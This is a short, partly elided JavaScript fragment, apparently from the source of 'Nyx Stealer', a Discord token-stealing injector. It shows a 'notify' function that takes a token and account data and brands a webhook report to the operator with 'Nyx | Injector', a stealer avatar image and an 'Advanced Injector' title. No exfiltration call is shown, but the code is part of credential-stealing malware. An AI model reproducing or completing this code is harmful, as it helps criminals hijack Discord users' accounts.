...
const notify = async (ctx, token, acc) => {
    ...
    ctx.username = "@Nyx | Injector";
    ctx.avatar_url = "https://cdn.discordapp.com/attachments/1185265069798465626/1270140493078069309/nyxstealer.png?ex=66b29e03&is=66b14c83&hm=226b92ce435cd1b0837066435bd0b17c8c32397cdd13f0bb426b7dde5fa165a1&";
    ctx.embeds[0].title = `Advanced Injector - ${ctx.title}`;
